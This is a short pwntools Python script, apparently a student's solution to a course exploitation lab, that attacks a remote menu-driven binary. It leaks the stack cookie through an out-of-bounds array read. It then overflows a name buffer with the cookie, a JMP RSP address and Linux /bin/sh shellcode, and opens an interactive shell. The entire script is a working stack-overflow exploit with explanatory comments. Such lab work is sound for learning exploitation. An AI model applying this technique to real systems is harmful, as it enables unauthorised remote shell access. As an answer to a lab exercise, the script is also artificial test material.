''' Script Module Importing '''
from pwn import *

context.arch = "x86_64"                         # Set Exploit Architecture to x86_64

''' Constant Initializing '''
JMP_RSP = 0x00401400                            # Set JMP RSP Address
SHELLCODE = asm(shellcraft.amd64.linux.sh())    # Generate Shellcode

''' Establish Connection '''
p = remote("csc748.hostbin.org", 7031)          # Test Script Against Server
# p = process("./3-1_lab.bin")                  # Test Script Locally
# p = gdb.debug("./3-1_lab.bin")                # Debug with GDB

''' Select Program Input '''
p.sendline(b'3')        # Select Option (3): Price Check
p.sendline(b'7')        # Select Invalid Option: Trigger Out-of-bounds Array Access


''' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '''
''' Step 1: Find Cookie Location with Hexdump '''
''' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '''

# print(hexdump(p.read(1500)))


''' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '''
''' Step 2:  Leak Cookie Location '''
''' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '''

''' Read in Data '''
p.readuntil(b'price: ')		        # Wait for Program Output
cookie_dec = p.readuntil(b'\n')     # Extract Cookie Value

''' Handle Negative Values '''
# Convert to Signed 2s Complement
cookie_int = int(cookie_dec.strip())
cookie_hex = format(cookie_int & 0xFFFFFFFFFFFFFFFF, '016x')

# Convert Hex String Back to an Integer
cookie_hex_int = int(cookie_hex, 16)
print(f"Cookie: 0x{cookie_hex} ({cookie_hex_int})")


''' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '''
''' Step 3: Prepare Payload and Overwrite Stack '''
''' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '''

''' Prepare Payload '''
p.sendline(b'2')            # Select Option (2): Change Restaurant Name

# Payload Format: buffer + cookie + rbp + return address
payload = b"A"*24 + p64(cookie_hex_int) + b"B"*8 + p64(JMP_RSP) + SHELLCODE

''' Overwrite the Stack '''
p.sendline(payload)         # Send the Payload


''' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '''
''' Step 4:  Force Program Exit to Trigger Return Address Usage '''
''' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '''

''' Exit '''
p.sendline(b'4')            # Select Option (4): Exit

''' Exploit Server '''
p.interactive()             # Start Interactive Session
